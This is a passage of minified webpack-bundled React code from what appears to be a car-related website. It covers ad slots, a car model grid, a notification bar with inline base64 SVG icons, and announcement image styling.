                i = e.slot,
                r = e.onAdvertError;
              return void 0 === e.hasAdblock ? null : n.createElement(f, c()({
                onError: r,
                slot: i,
                withReload: t.withReload
              }, t.props));
            }(Z) : null;
          return w ? D ? n.createElement("div", {
            "data-slot-name": t,
            "data-mark": S
          }, Y) : n.createElement(z.Z, {
            offset: d,
            preventUnload: L,
            placeholderHeight: T,
            "data-slot-name": t,
            withMinHeight: k,
            zIndex: C,
            contentVisibilityOn: !1
          }, n.createElement("div", {
            "data-slot-name": t,
            "data-mark": S
          }, Y)) : n.createElement(v, c()({
            height: T,
            showOnDesktop: P,
            showOnMobile: U,
            "data-slot-name": t,
            className: o,
            preventUnload: L,
            offset: d,
            isSticky: b,
            noSuspense: D,
            transparent: E,
            isCenterContent: A,
            withMinHeight: k,
            zIndex: C,
            mark: S,
            withoutSticky: y
          }, I), n.createElement("div", {
            "data-slot-name": t,
            "data-mark": S
          }, Y), l);
        }
        function C(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function S(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? C(Object(i), !0).forEach(function (t) {
              I()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : C(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var Z = h.Provider;
        const Q = function (e) {
          var t = e.children,
            i = e.targeting;
          return n.createElement(Z, {
            value: S({}, i)
          }, t);
        };
        var P = T.ZP.div.withConfig({
            displayName: "styled__BrandingWrap",
            componentId: "sc-1lclo8s-0"
          })(["position:fixed;top:0;left:0;right:0;bottom:0;display:flex;@media (min-width:1700px){display:block;max-width:1100px;margin:0 auto;}"]),
          U = T.ZP.div.withConfig({
            displayName: "styled__BrandingLimiter",
            componentId: "sc-1lclo8s-1"
          })(["flex-shrink:0;width:", "px;@media (max-width:1365px){width:", "px;}@media (max-width:1024px){width:100%;overflow:hidden;}"], m.wB, m.Fk),
          Y = T.ZP.div.withConfig({
            displayName: "styled__BrandingContent",
            componentId: "sc-1lclo8s-2"
          })(["display:flex;align-items:center;flex-grow:1;@media (min-width:1700px){position:absolute;left:100%;bottom:0;top:0;max-width:1100px;min-width:250px;align-items:flex-start;}"]);
        function _(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function W(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? _(Object(i), !0).forEach(function (t) {
              I()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : _(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        function G() {
          var e = (0, r.v9)(p.xK),
            t = (0, r.v9)(p.$V);
          return e ? null : n.createElement(Q, {
            targeting: W({}, t)
          }, n.createElement(P, null, n.createElement(U, null), n.createElement(Y, null, n.createElement(k, {
            slot: "2"
          }))));
        }
      },
      5601: (e, t, i) => {
        i.d(t, {
          Z: () => n
        });
        const n = (0, i(2168).ZP)({
          resolved: {},
          chunkName: function () {
            return "auth";
          },
          isReady: function (e) {
            var t = this.resolve(e);
            return !0 === this.resolved[t] && !!i.m[t];
          },
          importAsync: function () {
            return Promise.all([i.e(216), i.e(818)]).then(i.bind(i, 2777));
          },
          requireAsync: function (e) {
            var t = this,
              i = this.resolve(e);
            return this.resolved[i] = !1, this.importAsync(e).then(function (e) {
              return t.resolved[i] = !0, e;
            });
          },
          requireSync: function (e) {
            var t = this.resolve(e);
            return i(t);
          },
          resolve: function () {
            return 2777;
          }
        });
      },
      385: (e, t, i) => {
        i.d(t, {
          Z: () => s
        });
        var n = i(7294),
          r = i(9163),
          a = i(8526),
          o = r.ZP.div.withConfig({
            displayName: "styled__CarModelItem",
            componentId: "sc-ygk6pf-0"
          })(["display:block;text-align:center;margin-bottom:35px;box-sizing:border-box;justify-self:center;"]),
          l = (0, r.ZP)(a.rH).withConfig({
            displayName: "styled__CarModelLink",
            componentId: "sc-ygk6pf-1"
          })(["display:flex;flex-flow:column;align-items:center;border-bottom:none;@media (max-width:1024px){img{height:150px;width:150px;}}"]),
          c = r.ZP.span.withConfig({
            displayName: "styled__CarModelName",
            componentId: "sc-ygk6pf-2"
          })(["line-height:1.1;text-decoration:underline;color:#1c88d4;display:inline-block;"]);
        function s(e) {
          var t = e.model,
            i = e.width,
            r = t.id,
            s = t.picture,
            M = t.specialName,
            d = t.href;
          return n.createElement(o, {
            key: r
          }, d && n.createElement(l, {
            href: d,
            color: "#000"
          }, s && n.createElement(a.Ee, {
            picture: s,
            width: i || 180
          }), n.createElement(c, null, M)));
        }
      },
      8022: (e, t, i) => {
        i.d(t, {
          Z: () => l
        });
        var n = i(7294),
          r = i(9163).ZP.div.withConfig({
            displayName: "styled__ParkModelsTable",
            componentId: "sc-1rvfj1n-0"
          })(["display:grid;grid-template-columns:1fr 1fr 1fr;grid-gap:23px;align-items:center;@media (max-width:1024px){grid-template-columns:1fr 1fr;grid-gap:1rem;}"]),
          a = i(385);
        function o(e) {
          var t = e.carModels;
          return n.createElement(n.Fragment, null, t.map(function (e, t) {
            return n.createElement(a.Z, {
              model: e,
              key: t
            });
          }));
        }
        function l(e) {
          var t = e.cars;
          return n.createElement(r, null, t.map(function (e) {
            var t = e.carModels,
              i = e.url,
              r = e.id;
            return n.createElement(n.Fragment, null, t ? n.createElement(o, {
              carModels: t,
              id: r || 0,
              url: i || ""
            }) : n.createElement(a.Z, {
              model: e
            }));
          }));
        }
      },
      8090: (e, t, i) => {
        i.d(t, {
          Z: () => g
        });
        var n = i(3038),
          r = i.n(n),
          a = i(7294),
          o = i(9163),
          l = i(8655),
          c = o.ZP.div.withConfig({
            displayName: "styled__NotifyContainer",
            componentId: "sc-6qs6hz-0"
          })(["bottom:0;left:0;position:fixed;width:100%;height:48px;z-index:5;text-align:center;color:#fff;vertical-align:middle;line-height:48px;font-style:normal;font-weight:700;font-size:15px;"]),
          s = o.ZP.div.withConfig({
            displayName: "styled__NotifyMessage",
            componentId: "sc-6qs6hz-1"
          })(["display:inline-block;width:100%;"]),
          M = o.ZP.div.withConfig({
            displayName: "styled__MessageTitle",
            componentId: "sc-6qs6hz-2"
          })(["width:100%;height:48px;z-index:5;text-align:center;color:white;vertical-align:middle;line-height:48px;font-style:normal;font-weight:700;font-size:15px;background-color:", ';&:before{content:"";display:inline-block;width:39px;height:32px;background-size:cover;background-repeat:no-repeat;background-color:transparent;vertical-align:middle;margin-right:8px;background-image:', ";}"], (0, l.db)("$type", {
            success: "#27AE60",
            error: "#EB5757",
            warning: "#FF6B00"
          }), (0, l.db)("$type", {
            success: "url(".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzkiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzOSAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIwLjU4NDggMTkuMTg5NUMyMy41ODk5IDE5LjE4OTUgMjYuMTAyMiAxNy4wNTQ0IDI2LjY0OTEgMTQuMjM0OEgxNC41MjM2QzE1LjA3MDUgMTcuMDU0NCAxNy41Nzk4IDE5LjE4OTUgMjAuNTg0OCAxOS4xODk1WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEuODI3MDkgMTEuNTE0M0MwLjgyMDM4OCAxMS41MTQzIDAgMTIuMzA5NSAwIDEzLjI4NTNWMTUuODQyN0MwLjI3NjQ2OCAxNS43Njk5IDAuNTY0OTU2IDE1LjcyNjIgMC44NjU0NjUgMTUuNzI2MkgzLjY1NzE5VjEzLjI4NTNDMy42NTcxOSAxMi4zMDk1IDIuODM2OCAxMS41MTQzIDEuODI3MDkgMTEuNTE0M1oiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik02LjEzMDM3IDIwLjExNThDNi42MDgxOCAyMC4xMTU4IDYuOTk1ODQgMTkuNzQgNi45OTU4NCAxOS4yNzY5VjE4Ljg5NTNDNi45OTU4NCAxOC40MzIyIDYuNjA4MTggMTguMDU2NCA2LjEzMDM3IDE4LjA1NjRIMC44NjU0NjVDMC4zODc2NTYgMTguMDU2NCAwIDE4LjQzMjIgMCAxOC44OTUzVjE5LjI3NjlDMCAxOS43MzcxIDAuMzg3NjU2IDIwLjExNTggMC44NjU0NjUgMjAuMTE1OEg2LjEzMDM3WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTAuODY1NDY1IDIyLjQ0NkMwLjM4NzY1NiAyMi40NDYgMCAyMi44MjE4IDAgMjMuMjgyVjIzLjY2MzZDMCAyNC4xMjY3IDAuMzg3NjU2IDI0LjUwMjUgMC44NjU0NjUgMjQuNTAyNUg2LjEzMDM3QzYuNjA4MTggMjQuNTAyNSA2Ljk5NTg0IDI0LjEyNjcgNi45OTU4NCAyMy42NjM2VjIzLjI4MkM2Ljk5NTg0IDIyLjgxODkgNi42MDgxOCAyMi40NDMxIDYuMTMwMzcgMjIuNDQzMUgwLjg2NTQ2NVYyMi40NDZaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMzYuMzUyNSAwSDQuODIwMTZDMy4zNTk2OSAwIDIuMTcyNjggMS4xNDc2NCAyLjE3MjY4IDIuNTY2MThWOS4yMDE1M0M0LjM0NTM1IDkuMzczMzggNi4wNjEyNiAxMS4xMzg1IDYuMDYxMjYgMTMuMjg4MlYxNS43MjkxSDYuMTMwMzdDNy45MzM0MyAxNS43MjkxIDkuMzk5OTEgMTcuMTUwNiA5LjM5OTkxIDE4Ljg5ODJWMTkuMjc5OEM5LjM5OTkxIDE5LjU5NzMgOS4zNDg4MiAxOS45MDAyIDkuMjU4NjcgMjAuMTg4NkM5LjE4NjU1IDIwLjYyODQgOS4wMDYyNCAyMS4wMzYyIDguNzQ0OCAyMS4zOTE2QzkuMTUzNDkgMjEuOTIxNyA5LjM5NjkgMjIuNTc0MiA5LjM5NjkgMjMuMjg0OVYyMy42NjY1QzkuMzk2OSAyNC4wNTM5IDkuMzIxNzggMjQuNDIzOCA5LjE4OTU1IDI0Ljc2NDZIMTUuMjM1OEwyMC4wNTg5IDMxLjcxMTZDMjAuMzI2NCAzMi4wOTYxIDIwLjkxMjQgMzIuMDk2MSAyMS4xNzY4IDMxLjcxMTZMMjYgMjQuNzY0NkgzNi4zNTI1QzM3LjgxMyAyNC43NjQ2IDM5IDIzLjYxNyAzOSAyMi4xOTg0VjIuNTY2MThDMzkgMS4xNDc2NCAzNy44MTYgMCAzNi4zNTI1IDBaTTI2LjMzOTYgMy42OTkyNUMyNy44NzIyIDMuNjk5MjUgMjkuMTEzMyA0LjkwMjI0IDI5LjExMzMgNi4zODc3N0MyOS4xMTMzIDcuODczMjkgMjcuODcyMiA5LjA3NjI4IDI2LjMzOTYgOS4wNzYyOEMyNC44MDcgOS4wNzYyOCAyMy41NjU5IDcuODczMjkgMjMuNTY1OSA2LjM4Nzc3QzIzLjU2NTkgNC45MDIyNCAyNC44MSAzLjY5OTI1IDI2LjMzOTYgMy42OTkyNVpNMTQuOTM1MyAzLjY5OTI1QzE2LjQ2NzkgMy42OTkyNSAxNy43MDkgNC45MDIyNCAxNy43MDkgNi4zODc3N0MxNy43MDkgNy44NzMyOSAxNi40Njc5IDkuMDc2MjggMTQuOTM1MyA5LjA3NjI4QzEzLjQwMjcgOS4wNzYyOCAxMi4xNjE2IDcuODczMjkgMTIuMTYxNiA2LjM4Nzc3QzEyLjE2MTYgNC45MDIyNCAxMy40MDU3IDMuNjk5MjUgMTQuOTM1MyAzLjY5OTI1Wk0yOS4xNDMzIDEzLjA4MTRDMjkuMTQzMyAxNy43MjQ0IDI1LjMwNTggMjEuNTAyMyAyMC41ODQ4IDIxLjUwMjNDMTUuODYzOCAyMS41MDIzIDEyLjAyOTQgMTcuNzI0NCAxMi4wMjk0IDEzLjA4MTRWMTEuOTI1SDI5LjE0MzNWMTMuMDgxNFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=", ")"),
            error: "url(".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzkiIGhlaWdodD0iMzQiIHZpZXdCb3g9IjAgMCAzOSAzNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTExLjUwMzkgNy4wNDM4N0M5Ljc3MzY0IDcuMDQzODcgOC4zNjI3OSA4LjQ0ODkzIDguMzYyNzkgMTAuMTc4OUM4LjM2Mjc5IDExLjkwNTkgOS43NzA1NCAxMy4zMTQgMTEuNTAzOSAxMy4zMTRDMTMuMjM3MiAxMy4zMTQgMTQuNjQ1IDExLjkwOSAxNC42NDUgMTAuMTc4OUMxNC42NDUgOC40NDg5MyAxMy4yMzcyIDcuMDQzODcgMTEuNTAzOSA3LjA0Mzg3Wk0xMS43ODYgMTEuNzA0N0MxMC45Njc0IDExLjcwNDcgMTAuMzAwOCAxMS4wNDI0IDEwLjMwMDggMTAuMjIyM0MxMC4zMDA4IDkuNDAyMTQgMTAuOTY0MyA4LjczOTg0IDExLjc4NiA4LjczOTg0QzEyLjYwNzggOC43Mzk4NCAxMy4yNzEzIDkuNDAyMTQgMTMuMjcxMyAxMC4yMjIzQzEzLjI3MTMgMTEuMDQyNCAxMi42MDQ3IDExLjcwNDcgMTEuNzg2IDExLjcwNDdaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMjYuMTI0IDYuODg2MDRDMjQuMzAzOSA2Ljg4NjA0IDIyLjgyNDggOC4zNjIyOCAyMi44MjQ4IDEwLjE3OUMyMi44MjQ4IDExLjk5NTYgMjQuMzAzOSAxMy40NzE5IDI2LjEyNCAxMy40NzE5QzI3Ljk0NDIgMTMuNDcxOSAyOS40MjMzIDExLjk5NTYgMjkuNDIzMyAxMC4xNzlDMjkuNDIzMyA4LjM2MjI4IDI3Ljk0MTEgNi44ODYwNCAyNi4xMjQgNi44ODYwNFpNMjYuMTI0IDExLjcwNDdDMjUuMzA1NCAxMS43MDQ3IDI0LjYzODggMTEuMDQyNCAyNC42Mzg4IDEwLjIyMjNDMjQuNjM4OCA5LjQwMjE1IDI1LjMwMjMgOC43Mzk4NSAyNi4xMjQgOC43Mzk4NUMyNi45NDU3IDguNzM5ODUgMjcuNjA5MyA5LjQwMjE1IDI3LjYwOTMgMTAuMjIyM0MyNy42MDkzIDExLjA0MjQgMjYuOTQyNiAxMS43MDQ3IDI2LjEyNCAxMS43MDQ3WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTM1LjI2ODIgMEgyLjczMTc4QzEuMjIxNzEgMCAwIDEuMjE5MzcgMCAyLjcyNjU2VjIzLjU4NThDMCAyNS4wODk5IDEuMjIxNzEgMjYuMzEyNCAyLjczMTc4IDI2LjMxMjRIMTMuNDgyMkwxOC40NTg5IDMzLjY5MzZDMTguNzM0OSAzNC4xMDIxIDE5LjMzOTUgMzQuMTAyMSAxOS42MTI0IDMzLjY5MzZMMjQuNTg5MSAyNi4zMTI0SDM1LjI3MTNDMzYuNzc4MyAyNi4zMTI0IDM4LjAwMzEgMjUuMDkzIDM4LjAwMzEgMjMuNTg1OFYyLjcyNjU2QzM4IDEuMjE5MzcgMzYuNzc4MyAwIDM1LjI2ODIgMFpNNi4wMzQxMSAxMC4xNzlDNi4wMzQxMSA3LjE2NzY3IDguNDg2ODIgNC43MTk2NCAxMS41MDM5IDQuNzE5NjRDMTQuNTIwOSA0LjcxOTY0IDE2Ljk3MzYgNy4xNjc2NyAxNi45NzM2IDEwLjE3OUMxNi45NzM2IDEzLjE5MDIgMTQuNTIwOSAxNS42MzgzIDExLjUwMzkgMTUuNjM4M0M4LjQ4NjgyIDE1LjYzODMgNi4wMzQxMSAxMy4xODcxIDYuMDM0MTEgMTAuMTc5Wk0yMy43NTE5IDIxLjU2NDlIMTQuMjUxMkMxMy41NjU5IDIxLjU2NDkgMTMuMDEwOSAyMS4wMTA5IDEzLjAxMDkgMjAuMzI3QzEzLjAxMDkgMTkuNjQzIDEzLjU2NTkgMTkuMDg5IDE0LjI1MTIgMTkuMDg5SDIzLjc1MTlDMjQuNDM3MiAxOS4wODkgMjQuOTkyMiAxOS42NDMgMjQuOTkyMiAyMC4zMjdDMjQuOTkyMiAyMS4wMTA5IDI0LjQzNDEgMjEuNTY0OSAyMy43NTE5IDIxLjU2NDlaTTI2LjEyNCAxNS45MTA2QzIyLjk1ODEgMTUuOTEwNiAyMC4zODE0IDEzLjMzODggMjAuMzgxNCAxMC4xNzlDMjAuMzgxNCA3LjAxOTEyIDIyLjk1ODEgNC40NDczIDI2LjEyNCA0LjQ0NzNDMjkuMjg5OSA0LjQ0NzMgMzEuODY2NyA3LjAxOTEyIDMxLjg2NjcgMTAuMTc5QzMxLjg2NjcgMTMuMzM4OCAyOS4yODk5IDE1LjkxMDYgMjYuMTI0IDE1LjkxMDZaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K", ")"),
            warning: "url(".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzkiIGhlaWdodD0iMzQiIHZpZXdCb3g9IjAgMCAzOSAzNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM1LjUwMDIgMEgyLjc0OTc2QzEuMjI5NzQgMCAwIDEuMjE5MzcgMCAyLjcyNjU2VjIzLjU4NThDMCAyNS4wODk5IDEuMjI5NzQgMjYuMzEyNCAyLjc0OTc2IDI2LjMxMjRIMTMuNTcwOUwxOC41ODA0IDMzLjY5MzZDMTguODU4MSAzNC4xMDIxIDE5LjQ2NjggMzQuMTAyMSAxOS43NDE0IDMzLjY5MzZMMjQuNzUwOSAyNi4zMTI0SDM1LjUwMzRDMzcuMDIwMyAyNi4zMTI0IDM4LjI1MzEgMjUuMDkzIDM4LjI1MzEgMjMuNTg1OFYyLjcyNjU2QzM4LjI1IDEuMjE5MzcgMzcuMDIwMyAwIDM1LjUwMDIgMFpNMTAuNDY1MyA4Ljg2MzY0QzEwLjQ2NTMgNy4yODUyNyAxMS43NTQzIDYuMDA3MSAxMy4zNDYxIDYuMDA3MUMxNC45Mzc5IDYuMDA3MSAxNi4yMjcgNy4yODUyNyAxNi4yMjcgOC44NjM2NEMxNi4yMjcgMTAuNDQyIDE0LjkzNzkgMTEuNzIwMiAxMy4zNDYxIDExLjcyMDJDMTEuNzU0MyAxMS43MjAyIDEwLjQ2NTMgMTAuNDQyIDEwLjQ2NTMgOC44NjM2NFpNMjQuNjQ0OCAxOS44OTY4QzI0LjM3MzMgMjAuMjUyNyAyMy45NjEzIDIwLjQ0MTUgMjMuNTQzIDIwLjQ0MTVDMjMuMjU1OSAyMC40NDE1IDIyLjk2NTYgMjAuMzUxNyAyMi43MTU5IDIwLjE2OTFDMTkuMjI2NCAxNy41Njk1IDE1LjYxNTIgMjAuMDc2MyAxNS40NjU0IDIwLjE4NDZDMTQuODUwNiAyMC42MjEgMTMuOTg5MSAyMC40ODQ4IDEzLjU0NTkgMTkuODc4MkMxMy4xMDI3IDE5LjI3MTYgMTMuMjMzOCAxOC40MjA1IDEzLjg0NTUgMTcuOTc4QzE1LjY4NyAxNi42NDEgMjAuMjU2NCAxNC45MjY1IDI0LjM3MDEgMTcuOTg3M0MyNC45Nzg4IDE4LjQzOTEgMjUuMTAzNiAxOS4yOTMzIDI0LjY0NDggMTkuODk2OFpNMjUuMTM3OSAxMS43MjAyQzIzLjU0NjEgMTEuNzIwMiAyMi4yNTcxIDEwLjQ0MiAyMi4yNTcxIDguODYzNjRDMjIuMjU3MSA3LjI4NTI3IDIzLjU0NjEgNi4wMDcxIDI1LjEzNzkgNi4wMDcxQzI2LjcyOTcgNi4wMDcxIDI4LjAxODggNy4yODUyNyAyOC4wMTg4IDguODYzNjRDMjguMDE4OCAxMC40NDIgMjYuNzI5NyAxMS43MjAyIDI1LjEzNzkgMTEuNzIwMloiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=", ")")
          })),
          d = i(4343);
        function g(e) {
          var t = e.type,
            i = e.code,
            n = void 0 === i ? "" : i,
            o = e.autodissapear,
            l = void 0 === o ? 2e3 : o,
            g = e.onClose,
            u = e.message,
            m = function (e, t) {
              var i = d.to[e];
              return i ? i[t] : "";
            }(t, n),
            p = (0, a.useState)(!1),
            y = r()(p, 2),
            I = y[0],
            N = y[1];
          return (0, a.useEffect)(function () {
            l && setTimeout(function () {
              N(!0), g && g();
            }, l);
          }, [l]), I ? null : a.createElement(c, null, a.createElement(s, null, a.createElement(M, {
            $type: t
          }, m || u)));
        }
      },
      2718: (e, t, i) => {
        i.d(t, {
          Z: () => z
        });
        var n = i(7154),
          r = i.n(n),
          a = i(3038),
          o = i.n(a),
          l = i(6479),
          c = i.n(l),
          s = i(7294),
          M = i(9163),
          d = i(8655),
          g = i(2921),
          u = i(3493),
          m = i(8207),
          p = (0, M.ZP)(g.Z).withConfig({
            displayName: "styled__AnnouncementImg",
            componentId: "sc-1tvfxig-0"
          })(["display:block;margin-bottom:1rem;", " ", " ", ""], (0, d.fq)("$isInline", (0, M.iv)(["width:15rem;margin-right:0.9375rem;margin-bottom:0;margin-top:0.3125rem;flex-shrink:0;"])), (0, d.fq)("$imageGallery", (0, M.iv)(['position:relative;&:before{content:"";position:absolute;bottom:0;left:0;right:0;width:100%;background:#000;opacity:50%;height:100%;}&:after{content:"";width:50px;height:50px;background:url(', ") no-repeat 0 0;background-size:cover;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);}"], "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxjaXJjbGUgc3R5bGU9ImZpbGw6I2ZmMDAwMDsiIGN4PSIzMTYuNjExIiBjeT0iMTUyLjA4OCIgcj0iNTEuNDYiLz4NCjxwYXRoIHN0eWxlPSJmaWxsOiNmZjAwMDA7IiBkPSJNMzE2LjYwOCwyMTcuNzg0Yy0zNi4yMjIsMC02NS42OTEtMjkuNDY5LTY1LjY5MS02NS42OTFzMjkuNDY5LTY1LjY5MSw2NS42OTEtNjUuNjkxDQoJczY1LjY5MSwyOS40NjksNjUuNjkxLDY1LjY5MVMzNTIuODMxLDIxNy43ODQsMzE2LjYwOCwyMTcuNzg0eiBNMzE2LjYwOCwxMTQuODU0Yy0yMC41MzMsMC0zNy4yMzcsMTYuNzA0LTM3LjIzNywzNy4yMzcNCglzMTYuNzA0LDM3LjIzNywzNy4yMzcsMzcuMjM3czM3LjIzNy0xNi43MDQsMzcuMjM3LTM3LjIzN0MzNTMuODQ1LDEzMS41NiwzMzcuMTQxLDExNC44NTQsMzE2LjYwOCwxMTQuODU0eiIvPg0KPHBvbHlnb24gc3R5bGU9ImZpbGw6I2ZmMDAwMDsiIHBvaW50cz0iMzE5LjAzNiw0NDYuOTQzIDE5Mi44ODMsMjE0LjE0OSAzOC4yNzQsNDQ2Ljk0MyAiLz4NCjxwYXRoIHN0eWxlPSJmaWxsOiNmZjAwMDA7IiBkPSJNMzE5LjAzNCw0NjEuMTcxSDM4LjI3NGMtNS4yNDMsMC0xMC4wNi0yLjg4Mi0xMi41MzgtNy41MDNjLTIuNDc4LTQuNjItMi4yMTQtMTAuMjI4LDAuNjg2LTE0LjU5NA0KCWwxNTQuNjA5LTIzMi43OTVjMi43NjEtNC4xNTksNy40OTgtNi41NzIsMTIuNDg5LTYuMzQxYzQuOTg3LDAuMjIzLDkuNDkyLDMuMDQ1LDExLjg3MSw3LjQzNGwxMjYuMTUxLDIzMi43OTMNCgljMi4zOSw0LjQwOSwyLjI4Miw5Ljc1LTAuMjg1LDE0LjA1OEMzMjguNjkzLDQ1OC41MywzMjQuMDQ5LDQ2MS4xNzEsMzE5LjAzNCw0NjEuMTcxeiBNNjQuODAyLDQzMi43MTZoMjMwLjM0MUwxOTEuNjQ2LDI0MS43MjgNCglMNjQuODAyLDQzMi43MTZ6Ii8+DQo8cG9seWdvbiBzdHlsZT0iZmlsbDojZmYwMDAwOyIgcG9pbnRzPSI0NzMuNzI2LDQ0Ni45NDMgMzQ3LjU3NCwyOTIuODYgMjIxLjQyMiw0NDYuOTQzICIvPg0KPGc+DQoJPHBhdGggc3R5bGU9ImZpbGw6I2ZmMDAwMDsiIGQ9Ik00NzMuNzI4LDQ2MS4xNzFIMjIxLjQyM2MtNS40OTcsMC0xMC41MDQtMy4xNjgtMTIuODU4LTguMTM3DQoJCWMtMi4zNTUtNC45NjgtMS42MzMtMTAuODQ4LDEuODUtMTUuMTA0bDEyNi4xNTItMTU0LjA4M2MyLjcwMi0zLjMwMSw2Ljc0Mi01LjIxNCwxMS4wMDgtNS4yMTRjNC4yNjUsMCw4LjMwNiwxLjkxNCwxMS4wMDgsNS4yMTQNCgkJbDEyNi4xNTIsMTU0LjA4M2MzLjQ4Myw0LjI1NCw0LjIwMywxMC4xMzUsMS44NSwxNS4xMDRDNDg0LjIzLDQ1OC4wMDIsNDc5LjIyNSw0NjEuMTcxLDQ3My43MjgsNDYxLjE3MXogTTI1MS40NTgsNDMyLjcxNmgxOTIuMjM1DQoJCWwtOTYuMTE3LTExNy4zOTdMMjUxLjQ1OCw0MzIuNzE2eiIvPg0KCTxwYXRoIHN0eWxlPSJmaWxsOiNmZjAwMDA7IiBkPSJNNDcyLjgwNCw0NjIuMTNIMzkuMTk2QzE3LjU4Myw0NjIuMTMsMCw0NDQuNTQ2LDAsNDIyLjkzNFY4OS4wNjYNCgkJQzAsNjcuNDU0LDE3LjU4Myw0OS44NywzOS4xOTYsNDkuODdoNDMzLjYwOEM0OTQuNDE3LDQ5Ljg3LDUxMiw2Ny40NTQsNTEyLDg5LjA2NnYzMzMuODY3DQoJCUM1MTIsNDQ0LjU0Niw0OTQuNDE4LDQ2Mi4xMyw0NzIuODA0LDQ2Mi4xM3ogTTM5LjE5Niw3OC4zMjVjLTUuOTIzLDAtMTAuNzQyLDQuODE5LTEwLjc0MiwxMC43NDJ2MzMzLjg2Nw0KCQljMCw1LjkyMyw0LjgxOSwxMC43NDIsMTAuNzQyLDEwLjc0Mmg0MzMuNjA4YzUuOTIzLDAsMTAuNzQxLTQuODE5LDEwLjc0MS0xMC43NDJWODkuMDY2YzAtNS45MjMtNC44MTktMTAuNzQyLTEwLjc0MS0xMC43NDINCgkJSDM5LjE5NnoiLz4NCgk8cGF0aCBzdHlsZT0iZmlsbDojZmYwMDAwOyIgZD0iTTEyMy42OTEsMTM3LjQ0SDE0LjIyN0M2LjM3LDEzNy40NCwwLDEzMS4wNzEsMCwxMjMuMjEzczYuMzctMTQuMjI3LDE0LjIyNy0xNC4yMjdoMTA5LjQ2NA0KCQljNy44NTgsMCwxNC4yMjcsNi4zNjksMTQuMjI3LDE0LjIyN1MxMzEuNTQ5LDEzNy40NCwxMjMuNjkxLDEzNy40NHoiLz4NCgk8cGF0aCBzdHlsZT0iZmlsbDojZmYwMDAwOyIgZD0iTTk2LjY1NywxOTUuMjk4SDE0LjIyN0M2LjM3LDE5NS4yOTgsMCwxODguOTI4LDAsMTgxLjA3YzAtNy44NTgsNi4zNy0xNC4yMjcsMTQuMjI3LTE0LjIyN2g4Mi40MjkNCgkJYzcuODU4LDAsMTQuMjI3LDYuMzY5LDE0LjIyNywxNC4yMjdDMTEwLjg4NCwxODguOTI4LDEwNC41MTQsMTk1LjI5OCw5Ni42NTcsMTk1LjI5OHoiLz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjwvc3ZnPg0K")), (0, d.fq)("$videoGallery", (0, M.iv)(['position:relative;&:before{content:"";position:absolute;bottom:0;left:0;right:0;width:100%;background:#000;opacity:50%;height:100%;}&:after{content:"";width:50px;height:50px;background:url(', ") no-repeat 0 